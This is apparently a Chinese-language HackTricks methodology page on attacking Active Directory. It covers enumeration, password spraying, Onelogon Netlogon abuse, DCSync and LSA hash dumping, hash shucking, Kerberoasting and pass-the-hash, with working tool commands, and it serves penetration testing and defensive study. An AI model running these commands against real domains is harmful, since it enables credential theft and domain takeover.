# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基础概览

**Active Directory** 是一项基础技术，使**网络管理员**能够在网络中高效地创建和管理**域**、**用户**及**对象**。它经过扩展性设计，便于将大量用户组织到易于管理的**组**和**子组**中，同时控制不同级别的**访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树**和**林**。**域**包含一组共享同一数据库的对象，例如**用户**或**设备**。**树**是通过共享结构连接起来的一组域，而**林**则是多个树的集合，它们通过**信任关系**相互连接，构成组织结构的最高层级。每个层级都可以指定特定的**访问**和**通信权限**。

**Active Directory** 中的关键概念包括：

1. **Directory** – 存放与 Active Directory 对象相关的所有信息。
2. **Object** – 表示目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **Domain** – 作为目录对象的容器，多个域可以共存于一个**林**中，每个域维护自己的对象集合。
4. **Tree** – 共享同一个根域的一组域。
5. **Forest** – Active Directory 中组织结构的最高层级，由多个彼此存在**信任关系**的树组成。

**Active Directory Domain Services (AD DS)** 包含一系列对网络中的集中管理和通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中存储数据并管理**用户**与**域**之间的交互，包括**身份验证**和**搜索**功能。
2. **Certificate Services** – 负责安全**数字证书**的创建、分发和管理。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录功能的应用程序。
4. **Directory Federation Services** – 提供**单点登录**功能，使用户能够在一次会话中通过身份验证访问多个 Web 应用程序。
5. **Rights Management** – 通过限制受版权保护材料的未经授权分发和使用，帮助保护这些材料。
6. **DNS Service** – 对**域名**解析至关重要。

如需更详细的说明，请查看：[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

要学习如何**攻击 AD**，你需要非常好地**理解****Kerberos authentication process**。\
[**如果你仍然不知道它的工作原理，请阅读此页面。**](kerberos-authentication.md)

## Cheat Sheet

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io)，快速查看可以运行哪些命令来枚举/利用 AD。

> [!WARNING]
> Kerberos 通信**要求使用完整限定名称（FQDN）**来执行操作。如果你尝试通过 IP 地址访问计算机，**它将使用 NTLM，而不是 kerberos**。

## Recon Active Directory（无 creds/sessions）

如果你只能访问 AD 环境，但没有任何凭据/session，可以执行以下操作：

- **Pentest 网络：**
- 扫描网络，查找计算机和开放端口，并尝试**利用漏洞**或从中**提取凭据**（例如，[打印机可能是非常有趣的目标](ad-information-in-printers.md)。
- 枚举 DNS 可能会获取域中关键服务器的信息，例如 Web、打印机、共享、VPN、媒体等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)，了解如何执行此操作的更多信息。
- **检查 SMB 服务上的 null 和 Guest 访问**（这在现代 Windows 版本上无法使用）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 关于如何枚举 SMB 服务器的更详细指南，请参阅：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 关于如何枚举 LDAP 的更详细指南，请参阅此处（请**特别注意 anonymous access**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **投毒网络**
- 使用 [**Responder 冒充服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)收集凭据
- 通过[**滥用 relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)访问主机
- 通过[**evil-S 暴露伪造的 UPnP 服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
- 从域环境内部的文档、社交媒体、服务（主要是 Web）中提取用户名/姓名，也可以从公开信息中提取。
- 如果你找到公司员工的完整姓名，可以尝试不同的 AD **用户名约定 (**[**阅读此处**](https://activedirectorypro.com/active-directory-user-naming-convention/))。最常见的约定包括：_NameSurname_、_Name.Surname_、_NamSur_（各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个_随机字母和 3 个随机数字_（abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum：** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**：当请求**无效用户名**时，服务器会使用 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 进行响应，从而可以判断该用户名无效。**有效用户名**将返回 AS-REP 响应中的 **TGT**，或者返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户必须执行 pre-authentication。
- **No Authentication against MS-NRPC**：使用 auth-level = 1（无身份验证）针对域控制器上的 MS-NRPC（Netlogon）接口进行操作。在绑定 MS-NRPC 接口后，该方法调用 `DsrGetDcNameEx2` 函数，无需任何凭据即可检查用户或计算机是否存在。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了此类枚举。相关研究可参阅[此处](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA（Outlook Web Access）服务器**

如果你在网络中发现了这类服务器，还可以对其执行**用户枚举**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在[**这个 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)和另一个仓库（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）中找到用户名列表。
>
> 不过，你应该已经在此前执行的 recon 步骤中获取了**公司员工的姓名**。有了姓名和姓氏后，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成潜在的有效用户名。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

即使 DC 上已经修复了 **Zerologon**，被显式加入 allow-list 的账户仍可能暴露于**legacy/vulnerable Netlogon secure-channel 行为**。存在风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**，或对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL security descriptor**（参见 [Security Descriptors](security-descriptors.md)）。DACL 中被授予相关 ACE 的任何账户或组都可能成为攻击目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上会将 **Everyone** 加入 allow-list。

实际操作流程：

1. **通过检查** **SYSVOL/GPO** 和**正在运行的 DC 注册表**，识别加入 allow-list 的 principals。
2. 将 SDDL 中找到的 SIDs 解析为真实的 AD 用户/计算机，并优先关注 **DC machine accounts**、**trust accounts** 以及其他特权计算机。
3. 反复尝试以加入 allow-list 的账户进行 **MS-NRPC / Netlogon authentication**。
4. 成功猜出密码后，滥用 **Netlogon password-setting** 来重置目标账户密码（公开的 PoC 会将其设置为空字符串）。<sup>[[9]](#references)[[10]](#references)</sup>

来自公开 artifact 的快速 triage / lab 示例：
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
注：

- **scanner** 很有用，因为有效的 allow-list 可能存在于 **SYSVOL**、**registry**，或两者中。
- exploit path 本身很重要，因为一旦识别出存在漏洞的账户，便**不需要 Domain Admin 权限**。
- Compromising **Domain Controller machine account**（例如 `DC$`）尤其危险，因为重置该密码可以直接启用更广泛的 **AD takeover** 路径。
- **Brute-force 可行性**取决于模式：公开 artifact 描述了 meet-in-the-middle 方法、在拥有另一个 computer account 时进行 **24-bit** brute force，以及速度更慢的 **32-bit** 变体。

检测 / hardening 注意事项：

- Audit allow-list policy，并移除除临时且明确要求的 compatibility exceptions 之外的所有内容。
- Monitor DC **System** events **5827/5828/5829/5830/5831**，以捕获被拒绝、被发现或根据 policy 明确允许的 vulnerable Netlogon connections。
- 将 `VulnerableChannelAllowList` 中的 accounts 视为**高风险**，直到移除 legacy dependency。

### 知道一个或多个用户名

好了，假设你已经知道一个有效的 username，但没有 passwords……那么可以尝试：

- [**ASREPRoast**](asreproast.md)：如果某个 user **没有**属性 _DONT_REQ_PREAUTH_，你可以为该 user **request a AS_REP message**，其中会包含一些通过该 user 密码派生值加密的数据。
- [**Password Spraying**](password-spraying.md)：尝试对每个已发现的 user 使用最**常见的 passwords**，也许某个 user 使用了弱 password（注意 password policy！）。
- 注意，你还可以对 **OWA servers** 执行 **spray**，尝试获取对 users mail servers 的访问权限。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你或许可以通过对 **network** 中的某些 protocols 执行 **poisoning**，来**获得**一些可用于破解的 challenge **hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经成功枚举了 active directory，那么你将获得**更多 emails，并更好地了解 network**。你或许可以强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)，以获取对 AD env 的访问权限。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 按 engagement 保存 AD recon state：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下为各个 protocol 创建 SQLite DBs（smb/mssql/winrm/ldap/etc）。使用 `proto smb|mssql|winrm` 切换 views，并使用 `creds` 列出已收集的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- 使用 **`netexec smb <cidr>`** 快速发现 subnet，可显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的 members 容易受到 **relay** 攻击，而 DC 通常要求 signing。
- 直接根据 NetExec 输出在 `/etc/hosts` 中生成 **hostnames**，以便于 targeting：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked** by signing 时，仍应探测 **LDAP** posture：`netexec ldap <dc>` 会突出显示 `(signing:None)` / weak channel binding。即使 DC 要求 SMB signing，但 LDAP signing disabled，仍可能成为可行的 **relay-to-LDAP** target，用于 **SPN-less RBCD** 等 abuse。

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs 有时会在 HTML 中**嵌入经过掩码处理的管理员密码**。查看 source/devtools 可能暴露明文（例如 `<input value="<password>">`），从而允许通过 Basic-auth 访问 scan/print repositories。
- 获取的 print jobs 可能包含带有每个用户密码的**明文 onboarding 文档**。测试时保持配对关系一致：<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

如果你可以使用 **null 或 guest 用户访问其他 PC 或共享资源**，就可以**放置文件**（例如 SCF 文件）；如果这些文件被以某种方式访问，就会**触发针对你的 NTLM authentication**，从而可以**窃取** **NTLM challenge** 进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已经拥有的每个 NT hash 视为其他更慢格式的候选密码，这些格式的密钥材料直接从 NT hash 派生而来。与其对 Kerberos RC4 tickets、NetNTLM challenges 或 cached credentials 中的长密码短语进行暴力破解，不如将 NT hashes 输入 Hashcat 的 NT-candidate modes，让它验证密码复用情况，而无需获知明文。这在域被攻陷后尤其有效，因为此时你可以收集数千个当前和历史 NT hashes。<sup>[[5]](#references)</sup>

在以下情况下使用 shucking：

- 你从 DCSync、SAM/SECURITY dumps 或 credential vaults 中获取了 NT corpus，并且需要测试其是否在其他 domains/forests 中复用。
- 你捕获了基于 RC4 的 Kerberos material（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses 或 DCC/DCC2 blobs。
- 你想快速证明长且无法破解的密码短语存在复用，并立即通过 Pass-the-Hash 进行横向移动。

该技术**不适用于**密钥不是 NT hash 的 encryption types（例如 Kerberos etype 17/18 AES）。如果域强制使用 AES-only，则必须恢复使用常规的 password modes。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 配合 history，获取尽可能多的 NT hashes（以及它们之前的值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会显著扩大候选池，因为 Microsoft 最多可以为每个账户存储 24 个历史 hash。有关收集 NTDS secrets 的更多方法，请参阅：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或使用 Mimikatz `lsadump::sam /patch`）可以提取本地 SAM/SECURITY data 以及 cached domain logons（DCC/DCC2）。去重后，将这些 hashes 追加到同一个 `nt_candidates.txt` 列表中。
- **Track metadata** – 保留生成每个 hash 的 username/domain（即使 wordlist 中只有十六进制内容）。当 Hashcat 输出成功的候选值后，匹配的 hashes 会立即告诉你哪个 principal 正在复用该密码。
- 优先使用来自同一 forest 或 trusted forest 的 candidates；这样在 shucking 时获得重叠的可能性最大。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate inputs **必须保持为原始的 32 位十六进制 NT hashes**。禁用 rule engines（不要使用 `-r`，也不要使用 hybrid modes），因为 mangling 会破坏候选 key material。
- 这些 modes 本身并不会更快，但 NTLM keyspace（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约为 300 MH/s）快约 100 倍。测试经过筛选的 NT list，远比在慢速格式中探索整个 password space 廉价。
- 始终运行**最新的 Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`），因为 modes 31500/31600/35300/35400 是近期才加入的。<sup>[[7]](#references)</sup>
- 当前没有用于 AS-REQ Pre-Auth 的 NT mode；而 AES etypes（19600/19700）需要明文密码，因为它们的密钥通过 PBKDF2 从 UTF-16LE passwords 派生，而不是直接从原始 NT hashes 派生。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户为目标 SPN 捕获 RC4 TGS（详情请参阅 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT list 对 ticket 进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT candidate 派生 RC4 key，并验证 `$krb5tgs$23$...` blob。匹配成功即表示该 service account 使用了你现有的某个 NT hash。

3. 立即通过 PtH 进行横向移动：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，可以稍后使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### Example – Cached credentials (mode 31600)

1. 从已攻陷的 workstation 中 dump cached logons：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的 domain user 的 DCC2 行复制到 `dcc2_highpriv.txt`，然后进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 匹配成功后，会得到列表中已经已知的 NT hash，从而证明该 cached user 正在复用密码。可以直接将其用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或者使用快速 NTLM mode 对其进行暴力破解以恢复密码字符串。

完全相同的工作流也适用于 NetNTLM challenge-responses（`-m 27000/27100`）和 DCC（`-m 31500`）。确定匹配后，你可以发起 relay、SMB/WMI/WinRM PtH，或在 offline 状态下使用 masks/rules 重新破解 NT hash。



## 使用 credentials/session 枚举 Active Directory

在此阶段，你需要已经**攻陷有效 domain account 的 credentials 或 session**。如果你拥有某些有效 credentials，或拥有 domain user 的 shell，**应记住之前介绍的 options 仍然可以用于攻陷其他 users**。

开始 authenticated enumeration 之前，你应当了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

攻陷一个 account 是**开始攻陷整个 domain 的重要一步**，因为你将能够开始进行 **Active Directory Enumeration：**

关于 [**ASREPRoast**](asreproast.md)，现在你可以找出所有可能存在漏洞的 users；关于 [**Password Spraying**](password-spraying.md)，你可以获取**所有 usernames 的列表**，并尝试使用已攻陷 account 的密码、空密码以及新的潜在密码。

- 你可以使用 [**CMD 执行 basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell 进行 recon**](../basic-powershell-for-pentesters/index.html)，这样会更加 stealthier
- 你还可以 [**使用 powerview**](../basic-powershell-for-pentesters/powerview.md) 来提取更详细的信息
- Active Directory 中另一个出色的 recon 工具是 [**BloodHound**](bloodhound.md)。它**不是很 stealthy**（取决于你使用的 collection methods），但**如果你不在意这一点**，完全应该尝试一下。查找 users 可以通过 RDP 访问的位置、通往其他 groups 的路径等。
- **其他 automated AD enumeration tools 包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD 的 DNS records**](ad-dns-records.md)，因为其中可能包含有趣的信息。
- 你可以使用 **SysInternal** Suite 中的 **AdExplorer.exe**，这是一个用于枚举 directory 的 **GUI tool**。
- 你还可以使用 **ldapsearch** 在 LDAP database 中搜索 credentials，检查 _userPassword_ 和 _unixUserPassword_ 字段，甚至搜索 _Description_。其他方法请参阅 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)。
- 如果你使用的是 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举 domain。
- 你还可以尝试以下 automated tools：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

从 Windows 获取所有 domain usernames 非常简单（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 中，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使这个 Enumeration 部分看起来很短，它也是全部内容中最重要的部分。访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound 的链接），学习如何枚举 domain 并不断练习，直到你感到熟练。在 assessment 期间，这是找到通往 DA 的路径，或判断无法进行任何操作的关键时刻。

### Kerberoast

Kerberoasting 涉及获取由 user accounts 关联的 services 使用的 **TGS tickets**，并对其 encryption 进行 offline 破解——该 encryption 基于 user passwords。

更多相关内容请参阅：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

获取一些 credentials 后，你可以检查是否能够访问某台 **machine**。为此，可以根据 port scans 的结果，使用 **CrackMapExec** 尝试通过不同 protocols 连接多台 servers。

### Local Privilege Escalation

如果你已经攻陷 credentials，或拥有 regular domain user 的 session，并且该用户可以**访问 domain 中的任意 machine**，就应该尝试寻找**在本地提升权限并搜集 credentials 的方法**。这是因为只有拥有 local administrator privileges，才能**dump 其他 users 的 hashes**，包括从内存（LSASS）和本地（SAM）中 dump。

本书有完整页面介绍 [**Windows 中的 local privilege escalation**](../windows-local-privilege-escalation/index.html)，以及一个 [**checklist**](../checklist-windows-privilege-escalation.md)。另外，不要忘记使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

你在当前 user 的 **tickets** 中找到能够**授予你访问**意外 resources 权限的 tickets 的可能性**非常低**，但你可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经成功枚举了 Active Directory，那么你将拥有**更多电子邮件以及对网络更好的了解**。你可能能够强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**。**

### 在 Computer Shares | SMB Shares 中查找 Creds

现在你已经拥有一些基本凭据，应该检查是否能够在 **AD 内部共享的文件中找到**任何**有趣的文件**。你可以手动完成，但这是一项非常无聊且重复的任务（尤其是在你找到数百份需要检查的文档时）。

[**点击此链接了解可以使用的工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你能够**访问其他 PC 或 shares**，就可以**放置文件**（例如 SCF 文件）；如果这些文件以某种方式被访问，就会**触**发针对你的 **NTLM 身份验证**，这样你就可以**窃取** **NTLM challenge** 并对其进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何已身份验证的用户**入侵 domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## 使用 privileged credentials/session 在 Active Directory 上进行权限提升

**对于以下技术，普通 domain user 不够用，你需要某些特殊权限/凭据才能执行这些攻击。**

### Hash extraction

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[在本地提升权限](../windows-local-privilege-escalation/index.html) 成功**入侵了某个 local admin** 账户。\
然后，是时候 dump 内存中和本地的所有 hashes 了。\
[**阅读此页面，了解获取 hashes 的不同方法。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你拥有某个用户的 hash**，就可以使用它来**冒充**该用户。\
你需要使用某种**工具**来**使用**该**hash 执行** **NTLM authentication**，或者你可以创建新的 **sessionlogon**，并将该 **hash** **注入** **LSASS**，这样每当执行 **NTLM authentication** 时，就会**使用该 hash。**最后一种方式就是 mimikatz 所执行的操作。\
[**阅读此页面了解更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为通过 NTLM protocol 执行常规 Pass The Hash 的替代方案。因此，在**禁用 NTLM protocol 且只允许使用 Kerberos** 作为 authentication protocol 的网络中，这种方式尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者会**窃取用户的 authentication ticket**，而不是其 password 或 hash 值。随后使用此窃取的 ticket **冒充该用户**，从而获得对网络中资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个 **local administrator** 的 **hash** 或 **password**，就应该尝试使用它**在本地登录**其他 **PC**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意，这种方式相当**嘈杂**，而 **LAPS** 可以**缓解**此问题。

### MSSQL Abuse & Trusted Links

如果用户拥有**访问 MSSQL 实例**的权限，他可能可以利用该权限在 MSSQL 主机上**执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **哈希**，甚至执行 **relay** **攻击**。\
此外，如果某个 MSSQL 实例被另一个 MSSQL 实例信任（database link），而用户拥有受信任数据库的权限，那么他将能够**利用信任关系在另一个实例中执行查询**。这些信任关系可以串联，最终用户可能找到配置错误的数据库并在其中执行命令。\
**数据库之间的链接即使跨越 forest trusts 也可以正常工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方 inventory 和 deployment 套件通常会暴露获取凭据和执行代码的高权限路径。请参阅：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现某个 Computer 对象具有 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性，并且你在该计算机上拥有 domain 权限，那么你将能够从内存中 dump 登录该计算机的所有用户的 TGT。\
因此，如果 **Domain Admin 登录该计算机**，你将能够 dump 其 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充该用户。\
借助 constrained delegation，你甚至可以**自动 compromise Print Server**（希望它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许进行 "Constrained Delegation"，那么它将能够**冒充任意用户访问计算机上的某些服务**。\
因此，如果你**compromise 了该用户或计算机的哈希**，就能够**冒充任意用户**（甚至是 domain admins）访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限，可以通过该对象获得具有**提升权限**的代码执行能力：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被 compromise 的用户可能对某些 domain objects 拥有一些**有价值的权限**，这些权限可以让你进行横向**移动**/**提升**权限。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

发现 domain 中存在**正在监听的 Spool 服务**后，可以利用它来**获取新凭据**并**提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户****访问**被 **compromise** 的计算机，就可以从内存中**收集凭据**，甚至向其进程中**注入 beacon** 来冒充他们。\
通常用户会通过 RDP 访问系统，因此这里介绍如何针对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了管理加入 domain 的计算机上**本地 Administrator 密码**的系统，确保密码具有**随机性**、唯一且会频繁**更改**。这些密码存储在 Active Directory 中，并通过 ACL 将访问权限限制为授权用户。拥有足够权限访问这些密码后，就可以 pivot 到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从被 compromise 的计算机中**收集证书**可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**存在漏洞的模板**，就可以利用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

